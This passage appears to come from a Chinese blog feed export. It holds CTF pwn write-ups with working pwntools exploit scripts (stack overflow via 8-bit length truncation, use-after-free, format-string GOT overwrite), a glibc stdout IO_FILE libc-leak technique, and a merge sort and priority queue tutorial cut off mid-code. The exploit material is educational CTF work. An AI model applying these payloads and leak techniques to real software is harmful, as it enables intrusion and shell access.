<h2 id="2-r2t3"><a href="#2-r2t3" class="headerlink" title="2 r2t3"></a>2 r2t3</h2><h3 id="2-1题目分析"><a href="#2-1题目分析" class="headerlink" title="2.1题目分析"></a>2.1题目分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-408h]</span></span><br><span class="line"></span><br><span class="line">  my_init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**********************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*     Welcome to the BJDCTF!     *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Ret2text3.0?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Please input your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>u);</span><br><span class="line">  name_check(&amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome ,u win!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line">`read`了<span class="number">0x400</span>大小，但是并没有溢出,再让我们看下这个`name_check`</span><br><span class="line">```C</span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">name_check</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+7h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oops,u name is too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello,My dear %s"</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读入的长度只要小于3或者大于8都会直接将程序结束，看起来好像没有漏洞，但是注意这个<code>v3</code>是个<code>__int8</code>的，也就是只有一个字节，只要我们的长度足够大，就可以将这个长度溢出到我们需要的范围，进而在<code>strcpy</code>的时候构成栈溢出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./r2t3')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29481</span>)</span><br><span class="line">door = <span class="number">0x804858B</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x15</span></span><br><span class="line">payload += p32(door)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">237</span></span><br><span class="line">sh.recvuntil(<span class="string">"[+]Please input your name:\n"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="3-girlfriend"><a href="#3-girlfriend" class="headerlink" title="3 girlfriend"></a>3 girlfriend</h2><p>这道题是个uaf，挺简单，刚学堆的可以做一下这个题熟悉一下堆题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./ydsneedgirlfriend2')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28207</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"u choice :\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Please input the length of her name:\n"</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Please tell me her name:\n"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"u choice :\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">door = <span class="number">0x400D86</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#dele(1)</span></span><br><span class="line"><span class="comment">#dele(1)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x8</span>+p64(door))</span><br><span class="line">sh.recvuntil(<span class="string">"u choice :\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">sh.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x10,'a'*0x8+p64(door))</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="4-r2t4"><a href="#4-r2t4" class="headerlink" title="4 r2t4"></a>4 r2t4</h2><p>一道格式化字符串题目</p>
<h3 id="4-1题目分析"><a href="#4-1题目分析" class="headerlink" title="4.1题目分析"></a>4.1题目分析</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+<span class="number">0</span>h] [rbp<span class="number">-30</span>h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+<span class="number">28</span>h] [rbp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  printf(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>buf</code>可以直接溢出，有后门函数，但是开启了<code>canary</code>保护。</p>
<p>直接把后门函数的地址写到其它函数的got表里行不通，因为后面没有别的函数调用了</p>
<p>注意到我们触发canary的话<br><img src="/22/cl7iordm90003293fbnruuy45/6.png" alt><br>也会输出一个<code>stack smashing detect ***</code>这种东西</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是上面这个函数，我们可以通过劫持这个函数的got来拿shell</p>
<h3 id="4-2-exp"><a href="#4-2-exp" class="headerlink" title="4.2 exp"></a>4.2 exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./r2t4')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26917</span>)</span><br><span class="line">fini = <span class="number">0x600E18</span></span><br><span class="line">door = <span class="number">0x400626</span></span><br><span class="line">stack_ch = <span class="number">0x601018</span></span><br><span class="line">index = <span class="number">8</span></span><br><span class="line">payload = <span class="string">'bbbbb'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(<span class="number">0x626</span><span class="number">-5</span>) +<span class="string">'c'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(index) + <span class="string">'$hn'</span></span><br><span class="line">payload += p64(stack_ch)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="5-test"><a href="#5-test" class="headerlink" title="5 test"></a>5 test</h2><p>用od ????来读flag就行,还有类似*这样的通配符，很神奇</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">asc = <span class="string">'''</span></span><br><span class="line"><span class="string">066146 063541 032173 061067 031143 031067 026461 062470</span></span><br><span class="line"><span class="string">034146 032055 033146 026463 062142 031462 061055 031544</span></span><br><span class="line"><span class="string">062142 030467 061542 060544 076470</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(asc),<span class="number">7</span>):</span><br><span class="line">    a = asc[i:i+<span class="number">6</span>]</span><br><span class="line">    log.info(<span class="string">'a = '</span> + a)</span><br><span class="line">    num = int(a,<span class="number">8</span>)</span><br><span class="line">    h = hex(num)[<span class="number">2</span>:]</span><br><span class="line">    s = binascii.a2b_hex(h)</span><br><span class="line">    s = s[::<span class="number">-1</span>]</span><br><span class="line">    log.info(s)</span><br><span class="line">    flag += s</span><br><span class="line">    log.success(flag)</span><br></pre></td></tr></table></figure>

<h2 id="6-secret"><a href="#6-secret" class="headerlink" title="6 secret"></a>6 secret</h2><p>有一个buf那个地方可以溢出到后面的一个变量，在后面每次执行的时候那个变量指向的内容都会减一，所以可以把这个地方溢出成printf的got表,手动过16次就ok了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./secret')</span></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27147</span>)</span><br><span class="line">sh.recvuntil(<span class="string">" What's your name? ________________ #"</span>)</span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0</span>) +<span class="string">'\x40\xd0\x46'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE leak</title>
    <url>/year/03/15/cl7iordor000u293f5gbw7jh0/</url>
    <content><![CDATA[<p>上次比赛出了个<code>house of roman</code>思路的题，结果发现这个利用方式已经落后于时代了,当大家纷纷把这题秒了的时候，我顿时对自己产生了怀疑。所以记录一下。。。。</p>
<p>其实主要思路就是修改<code>stdout</code>的<code>flag</code>位为<code>0xfbad1800</code>,并且将<code>_IO_write_base</code>的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</p>
<a id="more"></a>
<h2 id="stdout泄露"><a href="#stdout泄露" class="headerlink" title="stdout泄露"></a>stdout泄露</h2><p>为什么<code>flag</code>要改成0xfbad1800，看源码：</p>
<p><code>puts</code>函数在源码中是由<code>_IO_puts</code>实现的，而<code>_IO_puts</code>函数内部会调用<code>_IO_sputn</code>，结果会执行<code>_IO_new_file_xsputn</code>，最终会执行<code>_IO_overflow</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> </span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>    </span><br><span class="line">    &#123;<span class="comment">//避免进入      </span></span><br><span class="line">     	f-&gt;_flags |= _IO_ERR_SEEN;      </span><br><span class="line">     	__set_errno (EBADF);      </span><br><span class="line">     	<span class="keyword">return</span> EOF;    </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">/* If currently reading or no buffer allocated. */</span>  </span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)&#123; </span><br><span class="line">    	......<span class="comment">//避免进入    </span></span><br><span class="line">    	......    </span><br><span class="line">		&#125;  </span><br><span class="line">	<span class="keyword">if</span> (ch == EOF)    </span><br><span class="line">    	<span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base, </span><br><span class="line">                             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); <span class="comment">//进入目标  </span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span>    </span><br><span class="line">    	<span class="keyword">if</span> (_IO_do_flush (f) == EOF)      </span><br><span class="line">        	<span class="keyword">return</span> EOF;  </span><br><span class="line">     *f-&gt;_IO_write_ptr++ = ch;  </span><br><span class="line">     <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)      </span><br><span class="line">         || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))    </span><br><span class="line">        <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,             </span><br><span class="line">                          f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) </span><br><span class="line">        	<span class="keyword">return</span> EOF;  </span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>_IO_do_write</code>是最后调用的函数，而<code>_IO_write_base</code>是我们要修改的目标。</p>
<p>这里<code>f-&gt;_flag &amp; _IO_NO_WRITES</code>的值应该为0，为了不进入第一个if分支</p>
<p>同时使<code>f-&gt;_flag &amp;_IO_CURRENTLY_PUTTING</code>的值为1，为了不进入第二个if分支</p>
<p><code>_IO_do_write</code>函数的参数为：stdout结构体、<code>_IO_write_base</code>和<code>size</code>(由<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>决定)，而<code>_IO_do_write</code>实际会调用<code>new_do_write</code>，参数一样。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用函数输出输出缓冲区</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">//最终输出 </span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里，<code>_IO_SYSWRITE</code>就是我们的目标，这相当于<code>write(fp,data,to_do)</code>。</p>
<p><code>_IO_SYSSEEK</code>只是简单的调用<code>lseek</code>，但是我们不能完全控制<code>fp-&gt;_IO_write_base - fp-&gt;_IO_read_end</code>的值，如果fp-&gt;_IO_read_end的值设置为0，那么<code>_IO_SYSSEEK</code>的第二个参数值就会过大，如果设置<code>fp-&gt;_IO_write_base = fp-&gt;_IO_read_end</code>的话，那么在其它地方就会有问题，因为<code>fp-&gt;_IO_write_base</code> 不能大于 <code>fp-&gt;_IO_write_end</code>。所以这里要设置<code>fp-&gt;_flags | _IO_IS_APPENDING</code>，避免进入else if 分支。</p>
<p>最终需要构造的fp-flags是这样的，才能绕过上面提到的分支。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span> </span><br><span class="line">_flags &amp;= ~_IO_NO_WRITES ## _flags = <span class="number">0xfbad0000</span> </span><br><span class="line">_flags |= _IO_CURRENTLY_PUTTING ## _flags = <span class="number">0xfbad0800</span></span><br><span class="line">_flags |= _IO_IS_APPENDING ## _flags = <span class="number">0xfbad1800</span></span><br></pre></td></tr></table></figure>

<p>所以通常将stdout的flags修改成0xfbad1800，将_IO_write_base改小，就可以造成libc的泄漏。</p>
]]></content>
      <tags>
        <tag>IO_FILE</tag>
        <tag>堆</tag>
        <tag>leak</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title>算法设计与分析</title>
    <url>/year/03/14/cl7iordqr0060293fmvkmppfm/</url>
    <content><![CDATA[<p>课上所学，课下实现，顺便学下Java</p>
<a id="more"></a>
<h1 id="1-归并排序"><a href="#1-归并排序" class="headerlink" title="1 归并排序"></a>1 归并排序</h1><h2 id="1-1-自顶向下的归并排序"><a href="#1-1-自顶向下的归并排序" class="headerlink" title="1.1 自顶向下的归并排序"></a>1.1 自顶向下的归并排序</h2><p>如果它能够将两个子数组排序，他就能通过归并两个子数组来将整个数组排序。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Merge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Comparable[] aux;    <span class="comment">//归并排序需要的数组</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        aux = <span class="keyword">new</span> Comparable[a.length];</span><br><span class="line">        sort(a, <span class="number">0</span>, a.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(hi &lt;= lo)    <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = lo + (hi - lo)/<span class="number">2</span>;</span><br><span class="line">        sort(a, lo, mid);</span><br><span class="line">        sort(a, mid+<span class="number">1</span>, hi);</span><br><span class="line">        merge(a, lo, mid, hi);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> mid,<span class="keyword">int</span> hi)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//将a[lo..mid] 和 a[mid+1..hi]归并</span></span><br><span class="line">        <span class="keyword">int</span> i = lo, j = mid + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = lo; k&lt;=hi; k++)   <span class="comment">//将a[lo..hi]复制到aux[lo..hi]</span></span><br><span class="line">            aux[k] = a[k];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = lo; k&lt;=hi; k++)   <span class="comment">//归并</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt; mid)                   a[k] = aux[j++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(j &gt; hi)               a[k] = aux[i++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(less(aux[i],aux[j]))  a[k] = aux[i++];</span><br><span class="line">            <span class="keyword">else</span>                          a[k] = aux[j++];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">less</span><span class="params">(Comparable v, Comparable w)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> v.compareTo(w) &lt; <span class="number">0</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-11-对小规模子数组使用插入排序"><a href="#1-11-对小规模子数组使用插入排序" class="headerlink" title="1.11 对小规模子数组使用插入排序"></a>1.11 对小规模子数组使用插入排序</h3><p>因为递归会使小规模问题中的递归调用过于频繁，所以改进对他们的处理就能改进整个算法。插入排序很可能在小数组上比归并排序更快。</p>
<h3 id="1-12-测试数组是否已经有序"><a href="#1-12-测试数组是否已经有序" class="headerlink" title="1.12 测试数组是否已经有序"></a>1.12 测试数组是否已经有序</h3><p>添加一个判断条件，如果a[mid]小于等于a[mid+1]，我们就认为数组是已经有序的，并跳过merge()方法。</p>
<h3 id="1-13-将不重复元素复制到数组"><a href="#1-13-将不重复元素复制到数组" class="headerlink" title="1.13 将不重复元素复制到数组"></a>1.13 将不重复元素复制到数组</h3><h2 id="1-2-自底向上的归并排序"><a href="#1-2-自底向上的归并排序" class="headerlink" title="1.2 自底向上的归并排序"></a>1.2 自底向上的归并排序</h2><p>这个merge的地方很巧妙,感觉这种写法更清晰一点，下面那种用while的我自己都快把自己绕晕了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeBU</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">less</span><span class="params">(Comparable v, Comparable w)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> v.compareTo(w) &lt; <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Comparable[] aux;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(Comparable[] a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//进行logN次两两归并</span></span><br><span class="line">        <span class="keyword">int</span> N = a.length;</span><br><span class="line">        aux = <span class="keyword">new</span> Comparable[N];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sz = <span class="number">1</span>; sz &lt;N; sz = sz + sz)         <span class="comment">//sz子数组大小</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> lo = <span class="number">0</span>; lo &lt; N-sz; lo += sz + sz)<span class="comment">// lo:子数组索引</span></span><br><span class="line">                merge(a, lo, lo + sz-<span class="number">1</span>, Math.min(lo+sz+sz-<span class="number">1</span>, N-<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Comparable[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> mid,<span class="keyword">int</span> hi)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//将a[lo..mid] 和 a[mid+1..hi]归并</span></span><br><span class="line">        <span class="keyword">int</span> i = lo, j = mid + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = lo; k&lt;=hi; k++)   <span class="comment">//将a[lo..hi]复制到aux[lo..hi]</span></span><br><span class="line">            aux[k] = a[k];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = lo; k&lt;=hi; k++)   <span class="comment">//归并</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt; mid)                   a[k] = aux[j++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(j &gt; hi)               a[k] = aux[i++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(less(aux[i],aux[j]))  a[k] = aux[i++];</span><br><span class="line">            <span class="keyword">else</span>                          a[k] = aux[j++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>自己用C写的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> *A,<span class="keyword">int</span> start,<span class="keyword">int</span> mid, <span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> B[end - start + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> s = start, t = mid+<span class="number">1</span>, k = start;</span><br><span class="line">	<span class="keyword">while</span>(s &lt;= mid &amp;&amp; t&lt;=end)&#123;</span><br><span class="line">		<span class="keyword">if</span>(A[s] &lt;= A[t])</span><br><span class="line">			B[k++ - start] = A[s++];   <span class="comment">//这里这个 -start坑了我好长时间 </span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			B[k++ - start] = A[t++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> j = k;</span><br><span class="line">    <span class="comment">//这里是个优化,可以减少赋值次数 </span></span><br><span class="line">	<span class="keyword">while</span>(s &lt;= mid)</span><br><span class="line">		A[j++] = A[s++];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=start; i&lt;=k<span class="number">-1</span>; i++)</span><br><span class="line">		A[i] = B[i - start];</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BottomupSort</span><span class="params">(<span class="keyword">int</span> *A, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> t = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(t&lt;=n)&#123;</span><br><span class="line">		<span class="keyword">int</span> s ,i;</span><br><span class="line">		i = <span class="number">0</span>;</span><br><span class="line">		s = t;</span><br><span class="line">		t = s*<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">while</span>(i + t &lt;=n)&#123;</span><br><span class="line">			Merge(A,i,i+s<span class="number">-1</span>,i+t<span class="number">-1</span>);</span><br><span class="line">			i = i+t;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(i+s &lt; n)&#123;</span><br><span class="line">			Merge(A,i,i+s<span class="number">-1</span>,n<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> A[<span class="number">10</span>] = &#123;<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">9</span>&#125;;</span><br><span class="line">	BottomupSort(A,<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=<span class="number">9</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>,A[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-堆实现的优先队列"><a href="#2-堆实现的优先队列" class="headerlink" title="2 堆实现的优先队列"></a>2 堆实现的优先队列</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.EmptyStackException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaxPQ</span>&lt;<span class="title">Key</span> <span class="keyword">extends</span> <span class="title">Comparable</span>&lt;<span class="title">Key</span>&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Key[] pq;       <span class="comment">//基于堆的完全二叉树</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> N = <span class="number">0</span>;     <span class="comment">//存储于pq[1...N]，pq[0]并没有使用</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MaxPQ</span><span class="params">(<span class="keyword">int</span> maxN)</span></span></span><br><span class="line"><span class="function">    </span>&#123;  pq = 